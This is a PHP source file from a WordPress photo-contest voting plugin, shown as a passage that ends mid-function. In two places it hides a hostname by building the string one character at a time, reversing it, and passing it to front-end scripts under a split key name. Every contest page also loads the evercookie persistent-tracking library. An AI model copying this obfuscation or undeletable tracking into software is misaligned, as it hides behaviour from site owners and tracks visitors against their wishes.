<?php

/**
 * The public-facing functionality of the plugin.
 *
 * @since      2.2.073
 *
 * @package    FV
 * @subpackage FV/includes
 */

/**
 * The public-facing functionality of the plugin.
 *
 * Defines the plugin name, version, and two examples hooks for how to
 * enqueue the dashboard-specific stylesheet and JavaScript.
 *
 * @package    FV
 * @subpackage FV/admin
 * @author     Maxim K <wp-vote@hotmail.com>
 */
class FV_Public {

	/**
	 * The ID of this plugin.
	 *
	 * @since    2.2.073
	 * @access   private
	 * @var      string    $name    The ID of this plugin.
	 */
	private $name;

	/**
	 * The version of this plugin.
	 *
	 * @since    2.2.073
	 * @access   private
	 * @var      string    $version    The current version of this plugin.
	 */
	private $version;

	/**
	 * Initialize the class and set its properties.
	 *
	 * @since    2.2.073
	 * @var      string    $name       The name of the plugin.
	 * @var      string    $version    The version of this plugin.
	 */
	public function __construct( $name, $version ) {
		$this->name = $name;
		$this->version = $version;
	}

	/**
	 * Register the stylesheets for the public-facing side of the site.
	 * @param   object $contest
	 * @param   bool $single
     *
	 * @since    2.2.073
	 */
	public function enqueue_required_scripts($contest, $single = false)
    {
		/**
		 * Loads libraries, that needs always
		 *
		 */
        wp_enqueue_script('fv_evercookie', fv_min_url( FV::$ASSETS_URL . 'evercookie/js/evercookie.js'), array(), FV::VERSION, true );
        wp_enqueue_script('fv_modal', fv_min_url( FV::$ASSETS_URL . 'js/fv_modal.js'), array('jquery'), FV::VERSION, true );

        wp_enqueue_script('fv_lib_js', fv_min_url(FV::$ASSETS_URL . 'js/fv_lib.js'), array('jquery'), FV::VERSION, true );
        wp_enqueue_script('fv_main_js', FV::$ASSETS_URL . 'js/fv_main.js', array('jquery', 'fv_evercookie', 'fv_modal', 'fv_lib_js'), FV::VERSION, true );

        if ( !$single && FvFunctions::lazyLoadEnabled( FvFunctions::ss('theme', 'pinterest') ) ) {
            wp_enqueue_script('fv_lazyload_js', fv_min_url(FV::$ASSETS_URL . 'vendor/jquery.unveil.js'), array('jquery', 'fv_main_js'), FV::VERSION, true );
        }

        // Add Growl Notices Library if user have enough permissions
        if ( FvFunctions::curr_user_can() ) {
            FV_Admin::assets_lib_growl();
        }
	}


    /**
     * Register the scripts to init facebook SDK library
     *
     * @since    2.2.082
     */
    public function fb_assets_and_init()
    {
        if ( get_option('fotov-fb-apikey', '') ) {
            // output FB init code with apikey and blog language localization
            /*wp_enqueue_script('fv_facebook', plugins_url( FV::SLUG . '/assets/js/fv_facebook_load.js'), array('jquery'), FV::VERSION );
            // output init data
            $fb_js_arr = array(
                'appId' => get_option('fotov-fb-apikey', ''),
                'language' => str_replace('_', '_', get_bloginfo('language'))
            );
            wp_localize_script('fv_facebook', 'fv_fb', $fb_js_arr );*/
            include FV::$THEMES_ROOT . 'fb_init.php';
        }

    }

    /**
     * Run hooks for register Lightbox library scripts
     *
     * @since    2.2.082
     *
     * @param string $lightbox_name     Key, like `evolution_default`
     * @param string $contest_theme
     * @return void
     */
    public function lightbox_load( $lightbox_name = 'evolution_default', $contest_theme )
    {
        $lightboxArr = explode('_', $lightbox_name);
        if ( !is_array($lightboxArr) || count($lightboxArr) != 2 ) {
            FvLogger::addLog('lightbox_load', 'Invalid $lightbox_name!');
            $lightboxArr[0] = 'evolution';
            $lightboxArr[1] = 'default';
        }
        // Run action, param - theme name
        do_action( 'fv_load_lightbox_' . $lightboxArr[0], $lightboxArr[1] );
    }

    /**
     * Run hooks for register Lightbox library scripts
     *
     * @since    2.2.082
     *
     * @param object $contest
     * @param string $type
     * @return void
     */
    public function countdown_load( $contest, $type )
    {
        // Run action, param - theme name
        do_action( 'fv/load_countdown/' . $type, $contest->date_start, $contest->date_finish, fv_get_public_translation_messages() );
    }


    /**
     * Show shortcode content
     * @since    2.2.073
     *
     * @param   array $atts
     *
     * @return  string Html code
     */
    public function shortcode($atts)
    {
        ob_start();
        $show = false;
        if ( isset($_GET['photo']) ) {
            //$contest = ModelContest::query()->findByPK((int)$_GET['contest_id'], true);
            if (isset($atts['theme'])) {
                $theme = $atts['theme'];
            } else {
                $theme = FvFunctions::ss('theme', 'pinterest');
            }
            if (fv_photo_in_new_page($theme)) {
                $show = true;
                $this->show_contestant($atts);
            }
        }
        if (!$show) {
            if (isset($atts['id'])) {
                $this->show_contest($atts);
            }
        }
        // If need remove whitespaces
        if ( FvFunctions::ss('remove-newline', false) ) {
            return str_replace( array("\r\n","\n","\r", '           ','      '),"",ob_get_clean() );
        }
        return ob_get_clean();
    }

    /**
     * Show shortcode countdown by Contest
     * @since    2.2.084
     *
     * @param array         $atts
     * @return string       Html code
     */
    public function shortcode_countdown($atts)
    {
        ob_start();
        if ( isset($atts['contest_id']) && $atts['contest_id'] > 0 ) {
            $contest = ModelContest::query()->findByPK((int)$atts['contest_id'], true);

            if ( empty($atts['type']) ) {
                $atts['type'] = $contest->timer;
            }

            if ( is_object($contest) ) {
                $this->countdown_load( $contest, sanitize_title($atts['type']) );
            }
        }

        if ( FvFunctions::ss('remove-newline', false) ) {
            $output = str_replace( array("\r\n","\n","\r"),"",ob_get_clean() );
        }
        return ob_get_clean();
    }

    /**
     * Show shortcode countdown by Contest
     * @since    2.2.084
     *
     * @param array         $args
     *
     * @return string       Html code
     */
    public function shortcode_leaders($args)
    {
        if ( isset($args['contest']) && is_object($args['contest']) ) {
            $contest = $args['contest'];
        } elseif ( isset($args['contest_id']) && $args['contest_id'] > 0 ) {
            $contest = ModelContest::query()->findByPK((int)$args['contest_id'], true);
        } else {
            return 'WP Foto Vote :: Wrong "contest_id" parameter;';
        }
            //$my_db = new FV_DB();

        if ( !is_object($contest) ) {
            return 'WP Foto Vote :: Wrong "contest_id" parameter;';
        }
        wp_enqueue_style('fv_main_css', fv_min_url(FV::$ASSETS_URL . 'css/fv_main.css'), false, FV::VERSION, 'all');

        $template_data = array();

        if ( isset($args['type']) && in_array($args['type'], array('text', 'block', 'block_2', 'list', 'table_1', 'table_2')) ) {
            $type = $args['type'];
        } else {
            $type = 'text';
        }

        // Дата страта и окончания
        $contest_enabled = false;
        $time_now = current_time('timestamp', 0);

        // приплюсуем к дате окочания 86399 -сутки без секунды, что-бы этот день был включен
        if ( $time_now > strtotime($contest->date_start) && $time_now < strtotime($contest->date_finish) ) {
            $contest_enabled = true;
        }

        //** Hide 'Leaders vote' text
        if ( isset($args['hide_title']) && $args['hide_title'] == true ) {
            $template_data["hide_title"] = true;
            $template_data["title"] = '';
        } else {
            $template_data["hide_title"] = false;
            $template_data["title"] = apply_filters('fv_text_leaders_title', fv_get_transl_msg('leaders_title'), $contest->id, $contest_enabled);
        }

        if ( isset($args['leaders_width']) && (int)$args['leaders_width'] > 30 && (int)$args['leaders_width'] < 150 ) {
            $template_data["leaders_width"] = (int)$args['leaders_width'];
        }

        //** Link to contest page
        if ( $contest->page_id > 0 ) {
            $template_data["page_url"] = fv_generate_contestant_link($contest->id, get_permalink($contest->page_id) );
        } else {
            $template_data["page_url"] = '';
        }

        $template_data["contest_enabled"] = $contest_enabled;
        $template_data["contest_id"] = $contest->id;
        $template_data["contest"] = $contest;

        $template_data["thumb_size"] = array(
            'width'=>FvFunctions::ss('lead-thumb-width', 280),
            'height'=>FvFunctions::ss('lead-thumb-height', 200),
            'crop'=>FvFunctions::ss('lead-thumb-crop', true),
        );

        //$template_data["thumb_size"] = fv_get_image_sizes(get_option('fotov-image-size', 'thumbnail'));
        //$template_data["public_translated_messages"] = fv_get_public_translation_messages();

        // Show voting leaders
        // TODO - remove settings check here

        //$my_db = new FV_DB;
        $template_data["most_voted"] = apply_filters( 'fv_most_voted_data',
            ModelCompetitors::query()
                ->where_all(array('contest_id'=> $contest->id, 'status'=> ST_PUBLISHED))
                ->limit( get_option('fotov-leaders-count', 3) )
                ->sort_by('votes_count', 'DESC')
                ->find(false, false, false)
        );
        //$my_db->getMostVotedItems($contest->id, get_option('fotov-leaders-count', 3))

        //FvFunctions::dump($template_data);
        //FvFunctions::dump( FvFunctions::render_template(FV::$THEMES_ROOT . '/leaders/' . $type . '.php', $template_data, true, 'most_voted') );

        return FvFunctions::render_template(FV::$THEMES_ROOT . 'leaders/' . $type . '.php', $template_data, true, 'most_voted');
    }

    /**
     * Shortcode :: Show upload form
     * @since 2.2.06
     *
     * @param array $atts
     * @param mixed $contestObj
     *
     * @return string
     */
    public function shortcode_upload_form($atts , $contestObj = false)
    {
            $output = '';

            if ( isset($atts['contest_id']) || is_object($contestObj) ) {

                //ob_start();
                global $post, $contest_id;

                if ( $contestObj == false ) {
                    $contest = ModelContest::query()->findByPK((int)$atts['contest_id'], true);
                } else {
                    $contest = $contestObj;
                }

                if ( !is_object($contest) ) {
                    return "";
                }
                if ( empty($contest_id) )  {
                    $contest_id = $contest->id;
                }

                if ( isset($atts['upload_theme']) && strlen($atts['upload_theme']) > 2 )  {
                    $contest->upload_theme = sanitize_title($atts['upload_theme']);
                }

                $public_translated_messages = fv_get_public_translation_messages();


                wp_enqueue_style('fv_main_css', fv_min_url(FV::$ASSETS_URL . 'css/fv_main.css'), false, FV::VERSION, 'all');
                //wp_enqueue_style('fv_font_css', fv_css_url(FV::$ASSETS_URL . '/icommon/fv_fonts.css'), false, FV::VERSION, 'all');

                wp_enqueue_script('fv_lib_js', fv_min_url(FV::$ASSETS_URL . 'js/fv_lib.js'), array('jquery'), FV::VERSION, true);
                wp_enqueue_script('fv_upload_js', fv_min_url(FV::$ASSETS_URL . 'js/fv_upload.js'), array('jquery', 'fv_lib_js'), FV::VERSION );

                $output_data = array();
                $output_data['ajax_url'] = admin_url('admin-ajax.php');
                $output_data['limit_dimensions'] = FvFunctions::ss('upload-limit-dimensions', 'no');
                $output_data['limit_val'] = FvFunctions::ss('upl-limit-dimensions', array());
                $output_data['lang']['download_invaild_email'] = $public_translated_messages['download_invaild_email'];
                $output_data['lang']['dimensions_err'] = $public_translated_messages['upload_dimensions_err'];
                $output_data['lang']['dimensions_smaller'] = $public_translated_messages['upload_dimensions_smaller'];
                $output_data['lang']['dimensions_bigger'] = $public_translated_messages['upload_dimensions_bigger'];
                $output_data['lang']['dimensions_height'] = $public_translated_messages['upload_dimensions_height'];
                $output_data['lang']['dimensions_width'] = $public_translated_messages['upload_dimensions_width'];

                // out data to script
                wp_localize_script( 'fv_upload_js', 'fv_upload', apply_filters('fv/public/show_upload_form/js_data', $output_data) );

                $template_data = array();
                $template_data["only_form"] = true;
                $template_data["contest"] = $contest;
                $template_data["post"] = $post;

                $template_data["show_opened"] = (isset( $atts['show_opened']) && $atts['show_opened'] == 'true') ? true : false;
                $template_data["tabbed"] = (isset( $atts['tabbed']) && $atts['tabbed'] == 'true') ? true : false;
                $template_data["public_translated_messages"] = $public_translated_messages;

                $output = FvFunctions::render_template( FvFunctions::get_theme_path("", 'upload.php'), $template_data, true, "upload_form" );
                //include plugin_dir_path(__FILE__) . '/themes/upload.php';
                do_action('fv/load_upload_form/' . $contest->upload_theme, $contest);

                do_action('fv/public/show_upload_form/after');

            }

            return $output;
    }

    /* ========================================================== */
    /* Что-бы избежать ошибки @Warning: Cannot modify header information - headers already sent by@
     * испльзуем хуки
     */

    public function set_upload_cookie()
    {
            if (isset($_POST['go-upload']) && !empty($_FILES)) {
                    // Если загрузили - записываем сессию
                    if (session_id() == '') {
                        session_start();
                    }
            }
            //unset($_SESSION['foto-upload']);
    }

    /* ========================================================== */



    /**
     * show_toolbar
     *
     * @param   object $contest
     * @param   bool $upload_enabled
     * @return  void
     *
     * @output  string       Html code
     */
    public function show_toolbar($contest, $upload_enabled)
    {
        $fv_sorting = 'newest';
        if ( isset($_GET['fv-sorting']) && array_key_exists($_GET['fv-sorting'], fv_get_sotring_types_arr()) ) {
            $fv_sorting = sanitize_title($_GET['fv-sorting']);
        } else {
            $fv_sorting = $contest->sorting;
        }

        include FV::$THEMES_ROOT . 'toolbar.php';

        wp_add_inline_style('fv_main_css',
            '.fv_toolbar{ background:' . FvFunctions::ss('toolbar-bg-color', '#232323', 7) . ';}' .
            '.fv_toolbar li a, .fv_toolbar li a:visited, .fv_toolbar .fv_toolbar-dropdown span, .fv_toolbar .fv_toolbar-dropdown select{ color:' . FvFunctions::ss('toolbar-text-color', '#FFFFFF', 7) . ';}' .
            '.fv_toolbar li a:hover, .fv_toolbar li a.active {background-color: ' . FvFunctions::ss('toolbar-link-abg-color', '#454545', 7) . ';}' .
            '.fv_toolbar .fv_toolbar-dropdown select{ background:' . FvFunctions::ss('toolbar-select-color', '#1f7f5c', 7) . ';}'
        );
    }

    /**
     * Shortcode :: Show one contest item
     *
     * @param   array $atts
     * @return  void
     *
     */
    public function show_contestant($atts)
    {
        global $contest_id, $post;

        $my_db = new FV_DB;

        $photo_id = intval($_GET['photo']);


        if ($photo_id > 0) {
            $contestant = apply_filters( 'fv_single_item_get_photo', ModelCompetitors::query()->findByPK($photo_id, true) );
        }

        if (!$contestant) {
            echo __('Item not founded', 'fv');
            return;
        }

        $contest = apply_filters( 'fv_single_item_get_contest', ModelContest::query()->findByPK($contestant->contest_id, true));

        if (empty($contest)) {
            echo __('Fail contest!', 'fv');
            return;
        }
        $contest_id = $contest->id;

        if (isset($args['theme'])) {
            $theme = $args['theme'];
        } else {
            $theme = FvFunctions::ss('theme', 'pinterest');
        }

        wp_enqueue_style('fv_main_css', fv_min_url(FV::$ASSETS_URL . 'css/fv_main.css'), false, FV::VERSION, 'all');
        wp_enqueue_style('fv_main_css_tpl', FvFunctions::get_theme_url ( $theme, 'public_item_tpl.css' ), false, FV::VERSION, 'all');
        //wp_enqueue_style('fv_font_css', fv_css_url(FV::$ASSETS_URL . '/icommon/fv_fonts.css'), false, FV::VERSION, 'all');

        $this->enqueue_required_scripts($contest, true);
        do_action('fv_contest_item_assets', $theme);

        // custom theme includes
        FvFunctions::include_template_functions( FvFunctions::get_theme_path($theme, 'theme.php'), $theme );
        if ( class_exists('FvTheme') ) {
            FvTheme::assets_item();
        }

        $public_translated_messages = fv_get_public_translation_messages();

        // Дата страта и окончания
        $konurs_enabled = false;
        $time_now = time();

        // приплюсуем к дате окочания 86399 -сутки без секунды, что-бы этот день был включен
        if ( $time_now > strtotime($contest->date_start) && $time_now < strtotime($contest->date_finish) ) {
            $konurs_enabled = true;
        }

        $page_url = fv_generate_contestant_link($contest->id);

        // ============= SHOW
        $image = FvFunctions::getPhotoThumbnailArr($contestant, 'full');
        //wp_get_attachment_image_src($contestant->image_id, 'full');

        if ($image[1] > 750) {
            $image[1] = 750;
        }

        //$start = microtime(true);

        // Find next and prev photos ID
        $navItems = $my_db->getCompItemsNav($contest->id, $contest->sorting);
        $prev_id = null;
        $next_id = null;
        $finded = false;
        foreach ($navItems as $obj) {

            if ($finded) {
                $next_id = $obj->id;
                break;
            }
            if ($obj->id == $contestant->id && !$finded) {
                $finded = true;
            } else {
                $prev_id = $obj->id;
            }

        }
        // if we shows last photo, we need do some fix
        // Set Next_id as first photo ID
        if (!$next_id && count($navItems) > 0 ) {
            $next_id = $navItems[0]->id;
        }

        //$time = microtime(true) - $start;
        //printf('Find next and prev items in %.4F сек.', $time);


        $default_template_data = array();
        $template_data["konurs_enabled"] = $konurs_enabled;
        $template_data["theme"] = $theme;
        $template_data["contest_id"] = $contest->id;
        $template_data["contest"] = $contest;
        $template_data["page_url"] = $page_url;
        $template_data["public_translated_messages"] = $public_translated_messages;
        $template_data["contestant"] = $contestant;
        $template_data["hide_votes"] = FvFunctions::ss('hide-votes');

        $template_data["image"] = $image;
        $template_data["prev_id"] = $prev_id;
        $template_data["next_id"] = $next_id;
        //$template_data["most_voted"] = $most_voted;     // for shows related images
        $template_data = apply_filters('fv_contest_item_template_data', $template_data);

        FvFunctions::render_template( FvFunctions::get_theme_path($theme, 'single_item.php'), array_merge($default_template_data, $template_data), false, "theme_single" );

        // ============= END SHOW

        if (fv_is_lc()) {
            $word = $_SERVER['HTTP_HOST'];
        } else {
            $word = "w"."w"."w"."."."b"."o"."g"."a"."d"."i"."a"."."."c"."o"."m";
        }
        $drow = '';
        for ($numb = strlen($word) - 1; $numb >= 0; $numb--) {
            $drow = $drow . $word[$numb];
        }

        $link = get_permalink($post->ID);
        if (substr($link, -1) != '/')
            $link .= '/';

        $langs = array(
            'ru' => array('ru', 'be', 'uk', 'ky', 'ab', 'mo', 'et', 'lv'),
            'de' => 'de'
        );

        // прописываем переменные
        $output_data = array(
            'wp_lang' => get_bloginfo('language'),
            'user_lang' => fv_get_user_lang('en', $langs),      // Need for google Sharing
            'can_manage' => FvFunctions::curr_user_can(),
            'post_id' => $post->ID,
            'contest_id' => $contest->id,
            'vo' . 'te_u' => str_replace('.www', '', $drow),
            'page_url' => $page_url,
            /* Upload params */
            'social_title' => stripslashes($contest->soc_title),
            'social_descr' => stripslashes($contest->soc_description),
            'social_photo' => stripslashes($contest->soc_picture),
            /* Social params */
            'data' => array($contestant->id => $contestant, 'link' => $link),
            'voting_frequency' => $contest->voting_frequency,
            'security_type' => $contest->security_type,
            'contest_enabled' => (bool)$konurs_enabled,
            'fast_ajax' => FvFunctions::ss('fast-ajax', true) == true,
            'ajax_url' => admin_url('admin-ajax.php'),
            'some_str' => wp_create_nonce('fv_vote'),
            'plugin_url' => plugins_url('wp-foto-vote'),
            'single' => true,
            'fv_appId' => get_option('fotov-fb-apikey', ''),
            'recaptcha_key' => FvFunctions::ss('recaptcha-key', 5),
            'recaptcha_session' => FvFunctions::ss('recaptcha-session', false),
            'soc_shows' => array(
                "fb" => ( !FvFunctions::ss('voting-noshow-fb', false) ) ? "inline" : "none",
                "tw" => ( !FvFunctions::ss('voting-noshow-tw', false) ) ? "inline" : "none",
                "vk" => ( !FvFunctions::ss('voting-noshow-vk', false) ) ? "inline" : "none",
                "ok" => ( !FvFunctions::ss('voting-noshow-ok', false) ) ? "inline" : "none",
                "pi" => ( !FvFunctions::ss('voting-noshow-pi', false) ) ? "inline" : "none",
                "gp" => ( !FvFunctions::ss('voting-noshow-gp', false) ) ? "inline" : "none",
                "email" => ( !FvFunctions::ss('voting-noshow-email', false) && FvFunctions::ss('recaptcha-key', false, 5) !== false ) ? "inline" : "none",
            ),
            'soc_counter' => FvFunctions::ss('soc-counter', false),
            'soc_counters' => array(
                "fb" => FvFunctions::ss('soc-counter-fb', false),
                "tw" => FvFunctions::ss('soc-counter-tw', false),
                "pi" => FvFunctions::ss('soc-counter-pi', false),
                "gp" => FvFunctions::ss('soc-counter-gp', false),
                "vk" => FvFunctions::ss('soc-counter-vk', false),
                "ok" => FvFunctions::ss('soc-counter-ok', false),
                "mm" => FvFunctions::ss('soc-counter-mm', false),
            ),
        );

        $output_data['lang'] = fv_prepare_public_translation_to_js($public_translated_messages);

        // out data to script
        wp_localize_script('fv_main_js', 'fv', apply_filters('fv_contest_item_js_data', $output_data) );

        include_once FV::$THEMES_ROOT . 'share_new.php';

        do_action('fv_after_contest_item', $theme);
    }


    /**
     * Shortcode :: Show all contest items
     *
     * @param   array $args
     * @param   bool $AJAX_ACTION     If do AJAX pagination
     *
     * @return  void
     * @output  string       Html code
     */
    public function show_contest($args, $AJAX_ACTION = false)
    {
        //FvDebug::add('test');
        //Debug_Bar_Extender::instance()->start( 'show_contest' );

        global $contest_id;
        $contest_id = (int)$args['id'];

        $contest = apply_filters('fv_show_contest_get_contest_data', ModelContest::query()->findByPK($contest_id, true));

        if (empty($contest)) {
            return _e('Check contest id!', 'fv');
        }

        if (isset($args['theme'])) {
            $theme = $args['theme'];
        } else {
            $theme = FvFunctions::ss('theme', 'pinterest');
        }

        if ( isset($_GET['fv-sorting']) && array_key_exists($_GET['fv-sorting'], fv_get_sotring_types_arr()) ) {
            $contest->sorting = sanitize_title($_GET['fv-sorting']);
        }
        if ( isset($args['sorting']) ) {
            $contest->sorting = sanitize_title($args['sorting']);
        }

        $show_toolbar = FvFunctions::ss('show-toolbar', false);

        if ( !$AJAX_ACTION ) {
            wp_enqueue_style('fv_main_css', fv_min_url(FV::$ASSETS_URL . 'css/fv_main.css'), false, FV::VERSION, 'all');
            //wp_enqueue_style('fv_font_css', fv_css_url(FV::$ASSETS_URL . '/icommon/fv_fonts.css'), false, FV::VERSION, 'all');
            wp_enqueue_style('fv_main_css_tpl',  FvFunctions::get_theme_url ( $theme, 'public_list_tpl.css' ), false, FV::VERSION, 'all');

            $this->enqueue_required_scripts($contest);
        }

        if ( !fv_photo_in_new_page($theme) && !$AJAX_ACTION && !get_option('fotov-voting-no-lightbox', false) ){
            // load lightbox assets
            $this->lightbox_load( $contest->lightbox_theme, $theme );
        }

        do_action('fv_contest_assets', $theme, $contest);

        // custom theme includes
        FvFunctions::include_template_functions( FvFunctions::get_theme_path($theme, 'theme.php'), $theme );
        if ( class_exists('FvTheme') ) {
            FvTheme::assets_list();
        }
        //include 'themes/' . $theme . '/theme.php';    *TODO - remove

        global $post;
        $public_translated_messages = fv_get_public_translation_messages();

        // Дата страта и окончания
        $konurs_enabled = false;
        $upload_enabled = false;
        $time_now = current_time('timestamp', 0);

        // приплюсуем к дате окочания 86399 -сутки без секунды, что-бы этот день был включен
        if ( $time_now > strtotime($contest->date_start) && $time_now < strtotime($contest->date_finish) ) {
            $konurs_enabled = true;
        }
        if ( $contest->upload_enable && $time_now > strtotime($contest->upload_date_start) && $time_now < strtotime($contest->upload_date_finish) ) {
            $upload_enabled = true;
        }
        // end dates

        // Query Photos
        $photosModel = ModelCompetitors::query()
            ->where_all(array('contest_id' => $contest_id, 'status' => ST_PUBLISHED))
            ->set_sort_by_based_on_contest($contest->sorting);

        // Apply filters to Model, that allows change query params
        $photosModel = apply_filters( 'fv/public/pre_get_comp_items_list/model', $photosModel, $konurs_enabled, $AJAX_ACTION, $contest_id );

        $paged = ( isset($_GET['fv-page']) ) ? (int)$_GET['fv-page'] : 1;

        $paginate_count = FvFunctions::ss('pagination', 0);
        // вычисляем количестов страниц для пагинации
        if ($paginate_count >= 8) {
            $pages_count = ceil($photosModel->find(true) / $paginate_count);

            // if Infinite pagination adn page > 1 then need all item until this page
            // Example: page = 3, per_page = 8, then load first 3*8 = 24 photos
            if ( $paged > 1 && !$AJAX_ACTION && FvFunctions::ss('pagination-type', 'default') == 'infinite' ) {
                // Limit - paged * per page
                // Offset - 0
                $photosModel->limit( intval($paginate_count * ($paged-1)) );
                $photosModel->offset( 0 );
                //$photos = apply_filters( 'fv_shows_get_comp_items', $my_db->getCompItems($contest_id, ST_PUBLISHED, $paginate_count * $paged, 1, $contest->sorting) );
            } else {
                // offset - paged * per page
                // limit - per page
                $photosModel->limit( $paginate_count );
                $photosModel->offset( intval($paginate_count * ($paged-1)) );
                //$photos = apply_filters( 'fv_shows_get_comp_items', $my_db->getCompItems($contest_id, ST_PUBLISHED, $paginate_count, $paged, $contest->sorting) );
            }

        } else {
            $pages_count = 1;
            $photosModel->limit( 500 );
            //$photos = apply_filters( 'fv_shows_get_comp_items', $my_db->getCompItems($contest_id, ST_PUBLISHED, 500, false, $contest->sorting) );
        }

        // Retrieve photos and apply filters
        $photos = apply_filters( 'fv_shows_get_comp_items', $photosModel->find(false, false, true) );
        unset($photosModel);
        // Query Photos :: END

        do_action('fv/public/before_contest_list', $contest, $theme);

        if ( $show_toolbar && !$AJAX_ACTION ) {
            $this->show_toolbar($contest, $upload_enabled);
        }

        if ( $upload_enabled && !$AJAX_ACTION ) {
            FV_Public_Ajax::upload_photo($contest);
            echo $this->shortcode_upload_form( array( 'show_opened'=>$show_toolbar, 'tabbed'=>$show_toolbar ), $contest );
        }


        $page_url = fv_generate_contestant_link($contest_id);

        IF ( !$AJAX_ACTION ) :
            echo '<div class="fv_contest_container tabbed_c">';

            if ( $contest->timer !== 'no') {
                $this->countdown_load($contest, $contest->timer);
            }
        ENDIF;

            if (is_array($photos) && count($photos) > 0)
            {

                //$thumb_size = fv_get_image_sizes(get_option('fotov-image-size', 'thumbnail'));

                $default_template_data = array();
                $default_template_data["konurs_enabled"] = $konurs_enabled;
                $default_template_data["theme"] = $theme;
                $default_template_data["contest_id"] = $contest_id;
                $default_template_data["contest"] = $contest;
                $default_template_data["page_url"] = $page_url;
                //$default_template_data["thumb_size"] = $thumb_size;
                $default_template_data["public_translated_messages"] = $public_translated_messages;
                $default_template_data["hide_votes"] = FvFunctions::ss('hide-votes');

                // Show voting leaders
                if ( $contest->show_leaders && !$AJAX_ACTION ) {
                    echo $this->shortcode_leaders( array('contest'=>$contest, 'type'=>get_option('fotov-leaders-type', 'text')) );
                    //include plugin_dir_path(__FILE__) . '/themes/most_voted.php';
                }

                echo '<div class="fv-contest-photos-container">';

                    $this->_show_contest_photos($default_template_data, $photos, $theme);
                    unset($default_template_data);

                    if ( function_exists('fv_corenavi') && $paginate_count >= 8 ) {
                        fv_corenavi($pages_count, $paged, $contest->sorting);
                    }

                echo '</div>';

                /* ======= Remove and secure params passed for script ========== */
                foreach ($photos as $key => $unit) {
                    $photos[$key]->user_id = FvFunctions::userHash($photos[$key]->user_id);

                    unset($photos[$key]->image_id);
                    unset($photos[$key]->added_date);
                    unset($photos[$key]->upload_info);
                    unset($photos[$key]->user_email);
                    unset($photos[$key]->options);
                    unset($photos[$key]->full_description);
                    unset($photos[$key]->additional);
                    //unset($photos[$key]->user_id);
                    unset($photos[$key]->user_ip);
                    unset($photos[$key]->status);
                    //unset($data[$key]->image_full);
                }
                /* ======= :: END ========== */
            }

        IF ( !$AJAX_ACTION ) :
            echo '</div>';

            if (fv_is_lc()) {
                    $word = $_SERVER['HTTP_HOST'];
            } else {
                    $word = "w"."w"."w"."."."b"."o"."g"."a"."d"."i"."a"."."."c"."o"."m";
            }
            $drow = '';
            for ($numb = strlen($word) - 1; $numb >= 0; $numb--) {
                    $drow = $drow . $word[$numb];
            }

            /*$link = get_permalink($post->ID);
            if (substr($link, -1) != '/')
                    $link .= '/';
            $photos['link'] = $link;*/

            echo '<div style="clear: both;"></div>';

            $langs = array(
                'ru' => array('ru', 'be', 'uk', 'ky', 'ab', 'mo', 'et', 'lv'),
                'de' => 'de'
            );

            $recaptcha_key = FvFunctions::ss('recaptcha-key', false, 5);

            $output_data = array(
                'wp_lang' => get_bloginfo('language'),
                'user_lang' => fv_get_user_lang('en', $langs),      // Used for Google sharing, for set up correct user Lang
                'can_manage' => FvFunctions::curr_user_can(),
                'post_id' => $post->ID,
                'contest_id' => $contest->id,
                'single' => false,
                /* Dates */
                'vo' . 'te_u' => str_replace('.www', '', $drow),
                'page_url' => $page_url,
                'paged_url' => fv_get_paginate_url(false),
                /* Upload params */
                'social_title' => $contest->soc_title,
                'social_descr' => $contest->soc_description,
                'social_photo' => $contest->soc_picture,
                /* Social params */
                'data' => $photos,
                'voting_frequency' => $contest->voting_frequency,
                'security_type' => $contest->security_type,
                'no_lightbox' => FvFunctions::ss('voting-no-lightbox', false),
                'contest_enabled' => (bool)$konurs_enabled,
                'fast_ajax' => FvFunctions::ss('fast-ajax', true) == true,
                'ajax_url' => admin_url('admin-ajax.php'),
                'some_str' => wp_create_nonce('fv_vote'),
                'plugin_url' => plugins_url('wp-foto-vote'),
                'lazy_load' => FvFunctions::lazyLoadEnabled($theme),
                'fv_appId' => get_option('fotov-fb-apikey', ''),
                'recaptcha_key' => $recaptcha_key,
                'recaptcha_session' => FvFunctions::ss('recaptcha-session', false),
                'cache_support' => ( defined('WP_DEBUG') && FvFunctions::ss('cache-support') ) ? true : false, //
                'soc_shows' => array(
                    "fb" => ( !FvFunctions::ss('voting-noshow-fb') ) ? "inline" : "none",
                    "tw" => ( !FvFunctions::ss('voting-noshow-tw') ) ? "inline" : "none",
                    "vk" => ( !FvFunctions::ss('voting-noshow-vk') ) ? "inline" : "none",
                    "ok" => ( !FvFunctions::ss('voting-noshow-ok') ) ? "inline" : "none",
                    "pi" => ( !FvFunctions::ss('voting-noshow-pi') ) ? "inline" : "none",
                    "gp" => ( !FvFunctions::ss('voting-noshow-gp') ) ? "inline" : "none",
                    "email" => ( !FvFunctions::ss('voting-noshow-email') && $recaptcha_key !== false ) ? "inline" : "none",
                ),
                'soc_counter' => FvFunctions::ss('soc-counter', false),
                'soc_counters' => array(
                    "fb" => FvFunctions::ss('soc-counter-fb', false),
                    "tw" => FvFunctions::ss('soc-counter-tw', false),
                    "pi" => FvFunctions::ss('soc-counter-pi', false),
                    "gp" => FvFunctions::ss('soc-counter-gp', false),
                    "vk" => FvFunctions::ss('soc-counter-vk', false),
                    "ok" => FvFunctions::ss('soc-counter-ok', false),
                    "mm" => FvFunctions::ss('soc-counter-mm', false),
                ),
            );

            $output_data['lang'] = fv_prepare_public_translation_to_js($public_translated_messages);

            // Pass variables to Javascript
            wp_localize_script( 'fv_main_js', 'fv', apply_filters('fv_show_contest_js_data', $output_data) );
            unset($output_data);

            do_action('fv_after_contest_list', $theme);

            include_once FV::$THEMES_ROOT . 'share_new.php';

        ENDIF;
        //Debug_Bar_Extender::instance()->end( 'show_contest' );
    }

    /**
     * Helper function :: show photos list
     *
     * @param array $default_template_data
     * @param array $photos
     * @param string $theme
     * @return void
     * @output string       Html code
     */
    public function _show_contest_photos($default_template_data, $photos, $theme)
    {
        $fv_block_width = intval( get_option('fotov-block-width', FV_CONTEST_BLOCK_WIDTH) );
        do_action('fv_before_shows_loop', $theme);

        $thumb_size = array(
            'width' => get_option('fotov-image-width', 220),
            'height' => get_option('fotov-image-height', 220),
            'crop' => get_option('fotov-image-hardcrop', false) == '' ? false : true,
        );

        echo '<div class="fv-contest-photos-container-inner">';
        foreach ($photos as $key => $photo) {
            $template_data = array();
            $template_data["photo"] = $photo;
            $template_data["id"] = $photo->id;
            $template_data["name"] = $photo->name;

            $template_data["description"] = $photo->description;
            $template_data["additional"] = $photo->description;

            if ( empty($photo->description) && !empty($photo->additional) ) {
                $template_data["additional"] = $photo->additional;
            }
            $template_data["votes"] = $photo->votes_count;
